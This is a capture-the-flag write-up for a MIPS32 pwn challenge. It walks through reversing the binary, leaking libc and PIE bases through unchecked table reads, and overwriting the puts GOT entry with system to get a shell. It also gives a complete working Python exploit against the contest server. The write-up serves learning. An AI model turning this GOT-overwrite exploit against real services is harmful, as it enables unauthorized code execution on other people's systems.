 Meeeps

## Understanding the challenge

|  |  |
| --- | --- |
| Category | Pwn |
| Event | DPCH Online Qualifiers (Cydea Range platform) |
| Team | Pwnag3 |
| Target | `nc 52.146.88.61 39901` (earlier instance: 36256) |
| Files given | `pwn-meeeps.tar.gz` (binary, `libc.so.6`, `ld.so.1`) |

### What the challenge says

"I like learning new arches." That is a hint about the architecture, not the bug.

### What am I even looking at

```bash
tar -xzf pwn-meeeps.tar.gz -C mp/
file mp/meeeps
```

Before anything else I needed to know the architecture, the bit width, the byte order, and whether the binary is stripped. Every later decision depends on this.

Output:

```text
mp/meeeps: ELF 32-bit LSB pie executable, MIPS, MIPS32 rel2 version 1 (SYSV),
dynamically linked, interpreter ./ld.so.1, with debug_info, not stripped
```

That tells me a lot:

- **MIPS32, little endian** - this is the "new arch". It runs on the server through qemu.
- **PIE** - the binary is loaded at a random address each run, so I cannot hardcode addresses.
- **not stripped, with debug\_info** - function names are kept, which makes reversing much easier.

### Checking the protections

```bash
readelf -lWd mp/meeeps | grep -E 'GNU_STACK|GNU_RELRO|BIND_NOW'
readelf -sW mp/meeeps | grep -i stack_chk
```

Why: `GNU_STACK` tells me if the stack is executable (it is not, so no shellcode on the stack). `GNU_RELRO` and `BIND_NOW` tell me whether the GOT is writable. `__stack_chk_fail` in the symbols means there is a stack canary, so a plain buffer overflow will be caught.

Result: NX on, canary on, PIE on, and only partial RELRO - **the GOT is writable**. That last point is the one that matters.

### Finding the functions

```bash
readelf -sW mp/meeeps | grep FUNC
```

This lists the functions. There are only four that belong to the program: `setup`, `readnum`, `process`, `main`. All the real logic is in `process`.

There was no MIPS objdump on the machine, so I disassembled with Python instead, using `pyelftools` to find the function bytes and `capstone` to decode them:

```python
from capstone import *
from elftools.elf.elffile import ELFFile

e = ELFFile(open('meeeps', 'rb'))
sym = next(s for s in e.get_section_by_name('.symtab').iter_symbols()
           if s.name == 'process')
text = e.get_section_by_name('.text')
code = text.data()[sym['st_value'] - text['sh_addr']:][:sym['st_size']]

md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 + CS_MODE_LITTLE_ENDIAN)
for i in md.disasm(code, sym['st_value']):
    print(f'{i.address:#06x}  {i.mnemonic:<10}{i.op_str}')
```

### How input is read

Every number the program reads goes through one small function:

```c
char buf[0x20] = {0};
if (read(0, buf, 0x1f) <= 0) exit(0);
return strtol(buf, NULL, 0);
```

Two things to note. It reads **up to** 31 bytes in a single `read` call, and `strtol` with base `0` accepts hex (`0x...`) and negative numbers. Both facts matter later.

### The menu, and the two bugs

`process` first reads a name into a 0x40 buffer with a limit of 0x3f bytes. That part is correct - no overflow there. Then it loops on a menu:

| Option | What it does | Bounds check |
| --- | --- | --- |
| 1 - read | `printf("%p\n", table[idx])` | **none** |
| 2 - store | `table[idx] = val` | `0 <= idx < 0x40`, correct |
| 3 - go | `*(fp + 0x24 + 4*idx) = val` | **none** |

The only option that is properly checked is the one that writes into the global array. The two that are not checked give me:

- an **arbitrary read** I can repeat as many times as I like, and
- a **single arbitrary write**.

### The detail that decides the exploit

Look at what runs immediately after that single write:

```c
puts("done");
puts(name);      /* the buffer I filled at the start */
exit(0);
```

This is important. `process` never returns, so overwriting a saved return address is useless - `exit(0)` runs instead. But two `puts` calls happen right after my write, and I control the string passed to the second one.

So the plan writes itself: **overwrite the GOT entry for `puts` with the address of `system`, and set `name` to `/bin/sh`.** Then `puts("done")` becomes `system("done")`, which fails harmlessly, and `puts(name)` becomes `system("/bin/sh")`, which gives me a shell.

## Leaks, the write, and the shell

### Turning the read into a leak

The read primitive is `table[idx]`, where `table` is a global variable sitting at offset `0x200c0` inside the binary. The GOT is also inside the binary. Because both live in the same file, the distance between them never changes, even with PIE. So I can compute an index that reaches any GOT entry **without knowing a single runtime address**:

```text
idx = (address_of_got_entry - 0x200c0) / 4
```

MIPS arranges its GOT differently from x86. The first `DT_MIPS_LOCAL_GOTNO` slots are local entries, and global symbols start at `DT_MIPS_GOTSYM`. I pulled those values out of the binary rather than guessing:

```python
local  = tags['DT_MIPS_LOCAL_GOTNO']    # 14
gotsym = tags['DT_MIPS_GOTSYM']         # 10
got    = e.get_section_by_name('.got')['sh_addr']   # 0x20020

for i in range(gotsym, symno):
    name = dynsym.get_symbol(i).name
    addr = got + 4*(local + (i - gotsym))
    print(name, hex(addr), (addr - 0x200c0)//4)
```

That gives the two indices I need:

| Target | Address | index to use | What it leaks |
| --- | --- | --- | --- |
| GOT entry for `read` | `0x20094` | -11 | libc base |
| local GOT slot holding `&table` | `0x20040` | -32 | binary base |

The second one is the neat part. MIPS stores the runtime addresses of the program's own data in local GOT slots, so that slot literally contains the real address of `table`. Read it, subtract `0x200c0`, and PIE is defeated.

**Why `read` and not `puts` for the libc leak:** MIPS resolves imported functions lazily, on first call. `puts` has not been called yet at that point, so its slot still holds a stub inside the binary, not a libc address. `read`, `write` and `strtol` were all used already by `readnum`, so their slots hold real libc addresses.

The offsets come from the libc that ships with the challenge:

```text
read    0x111f20
system  0x4eb28
environ 0x1e5eb8
```

Two menu round-trips later:

```text
[+] libc read   = 0x14b1f20  -> libc base   = 0x13a0000
[+] &table      = 0xb400c0   -> binary base = 0xb20000
```

### Finding the stack frame

The write goes to `fp + 0x24 + 4*idx`. Because `idx` is a signed 32-bit number, `4*idx` wraps around the whole address space, so the write can reach **any** 4-byte-aligned address - as long as I know `fp`.

Nothing leaks `fp` directly. But now that I know where `table` really is, my read can fetch any address at all:

```python
idx = (target_address - table_abs) // 4
```

So I read libc's `environ` variable, which always holds a pointer into the stack. That gets me close, but not exact - `environ` points near the top of the stack, while my frame is some hundreds of bytes lower, and the gap depends on the environment.

So I scan, but I scan for something unmistakable. `process` saves its return address at `fp+0xac`, and that value is always `binary_base + 0xec4` (the instruction in `main` right after the call). One known value, at one known offset inside the frame:

```python
want = binbase + 0xec4
top  = (stack & ~3) - 8
for off in range(0, 0x3000, 4):
    a = top - off
    if read_at_idx((a - table_abs) // 4) == want:
        fp = a - 0xac
        break
```

Scanning **downward** is safe here. Everything between the current stack pointer and the top of the stack is mapped memory, and my frame sits above the stack pointer, so I find the match before I can walk off into unmapped memory and crash. Scanning upward past `environ` would be the way to kill the process.

### The single write

```python
target = binbase + 0x2007c          # GOT entry for puts
system = libc + 0x4eb28
idx    = ((target - (fp + 0x24)) // 4) & 0xffffffff

send(num(3) + num(idx) + num(system))
```

The `num()` helper converts each value into the signed 32-bit form that `strtol` will produce. Anything at or above `0x80000000` has to be sent as a negative decimal, because `strtol` clamps at `LONG_MAX` on overflow and would silently write the wrong address.

The name buffer was set to `/bin/sh` at the very beginning of the session, before any of the leaking started.

### The exploit

```python
import re, socket, sys, threading

TABLE      = 0x200c0
PUTS_GOT   = 0x2007c
GOT_TABLE  = 0x20040
GOT_READ   = 0x20094
RA_IN_MAIN = 0xec4

LIBC_READ    = 0x111f20
LIBC_SYSTEM  = 0x4eb28
LIBC_ENVIRON = 0x1e5eb8

s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=15)
buf = b''

def recv_until(tok, timeout=15):
    global buf
    s.settimeout(timeout)
    while tok not in buf:
        d = s.recv(65536)
        if not d:
            raise EOFError('closed')
        buf += d
    i = buf.index(tok) + len(tok)
    out, buf = buf[:i], buf[i:]
    return out

def num(x):
    """one readnum() worth of input, padded to exactly 31 bytes"""
    x &= 0xffffffff
    if x >= 0x80000000:
        x -= 0x100000000
    return str(x).encode().ljust(31)[:31]

def read_at_idx(idx):
    s.sendall(num(1) + num(idx))
    recv_until(b'i: ')
    line = recv_until(b'\n')
    m = re.search(rb'0x[0-9a-f]+', line)
    if m:
        return int(m.group(0), 16)
    if b'(nil)' in line:        # glibc prints this for %p of NULL
        return 0
    raise ValueError('unparsed: ' + repr(line[-60:]))

recv_until(b'name: ')
s.sendall(b'/bin/sh\x00'.ljust(63)[:63])

libc      = read_at_idx((GOT_READ  - TABLE) // 4) - LIBC_READ
table_abs = read_at_idx((GOT_TABLE - TABLE) // 4)
binbase   = table_abs - TABLE
stack     = read_at_idx((libc + LIBC_ENVIRON - table_abs) // 4)

want, fp = binbase + RA_IN_MAIN, None
top = (stack & ~3) - 8
for off in range(0, 0x3000, 4):
    a = top - off
    if read_at_idx((a - table_abs) // 4) == want:
        fp = a - 0xac
        break

idx = ((binbase + PUTS_GOT - (fp + 0x24)) // 4) & 0xffffffff
s.sendall(num(3) + num(idx) + num(libc + LIBC_SYSTEM))

s.sendall(b'cat flag.txt\n')
# then pump the socket in a thread and forward stdin
```

### Three scripts, two failures

The final exploit did not come out right on the first try. Three files were written, and the differences between them are the whole lesson of this challenge.

**Script 1: `meeps.py` - blind brute force.** No leaks at all. It hardcoded `system = 0x171eb28` from an earlier guess, then tried indices from `-100` to `50` in steps of 5, opening a fresh connection each time:

```python
system = 0x171eb28
for idx in range(-100, 50, 5):
    try_exploit(idx, system)
    time.sleep(0.3)
```

It could never work. The binary is PIE and libc is ASLR'd, so `system` is at a different address on every run - a number copied from a previous session is meaningless. And the write target is relative to `fp`, which moves with the stack. Guessing two independently randomised values at once is not a strategy. **Leak first, then write. Never write blind.**

**Script 2: `meeps_exploit.py` - correct idea, broken transport.** This one did the leaks properly. The problem was in how it scanned the stack. To go faster it batched 256 read requests into one giant send:

```python
def read_many(idxs):
    pkt = b''.join(num(1) + num(i) for i in idxs)   # ~15 KB in one go
    s.sendall(pkt)
```

The assumption was that each `read(0, buf, 0x1f)` on the server consumes exactly 31 bytes, so 256 padded requests line up perfectly with 256 reads.

That assumption is wrong. `read()` returns **whatever is available right now**, up to 31 bytes - not necessarily 31. When the 15 KB arrived split across TCP segments, one `read` came back with a partial block. From that point every following read was offset by a few bytes, so a fragment of an index got parsed as the menu choice. Eventually a stray `3` was read as option 3, the program did its single write and called `exit(0)`, and my script died with:

```text
EOFError: closed: ...
```

**Script 3: `meeeps_exploit.py` - the one that worked.** Two changes fixed it.

First, the scan went back to being sequential - send one request, wait for its answer, then send the next:

```python
def read_at_idx(idx):
    s.sendall(num(1) + num(idx))
    recv_until(b'i: ')
    line = recv_until(b'\n')
```

Slower per request, but the two sides can never drift out of step, because I never send request N+1 until I have seen the reply to request N.

Second, the parser learned about `(nil)`:

```python
m = re.search(rb'0x[0-9a-f]+', line)
if m:
    return int(m.group(0), 16)
if b'(nil)' in line:          # glibc prints "(nil)" for %p of NULL
    return 0
raise ValueError('unparsed: ' + repr(line[-60:]))
```

The stack scan walks through thousands of words, and plenty of them are zero. `printf("%p", 0)` in glibc does **not** print `0x0` - it prints the literal string `(nil)`. The old regex `0x[0-9a-f]+` found nothing on those lines, `re.search` returned `None`, and the script crashed on `.group(0)` of `None` - usually a few hundred words into a scan that had already taken a minute.

Thirty seconds of reading glibc's `printf` behaviour would have saved that debugging round. It is a tiny detail, but a scanner that reads thousands of values will meet every edge case the formatter has.

### Running it

```bash
python meeeps_exploit.py 52.146.88.61 39901
```

```text
[*] name set to /bin/sh
[+] libc read   = 0x14b1f20  -> libc base   = 0x13a0000
[+] &table      = 0xb400c0   -> binary base = 0xb20000
[+] environ     = 0x134ed0c  (stack)
[*] scanning stack downward for saved $ra 0xb20ec4 ...
[+] saved $ra at 0x134ea14 -> fp = 0x134e968
[*] puts@got 0xb2007c <- system 0x13eeb28
[*] fired, dropping to shell
```

### Flag

```text
pwn{m1p5_1s_34s13r_th4n_y0u_7h1nK_[A-Za-z0-9]{61794665559BiblvEIif9948f8bba1a52b889006788a6bd3fd02f190c15_544}}
```

Same generator bug as Helios Vault - the `[A-Za-z0-9]{6` is leftover template text and the flag is submitted exactly as printed, double `}}` included.

### Why it works

The program checks the index on the one operation that cannot do much harm and forgets to check it on the two that can. The arbitrary read turns the GOT into a map of memory, which defeats both ASLR and PIE at no cost. The arbitrary write only gets used once, but the author placed two function calls immediately after it, and gave me control of the argument to the second one. Writing `system` over `puts` turns the program's own clean-up code into the exploit.

---

[← All DPCH Online Qualifiers writeups](README.md)
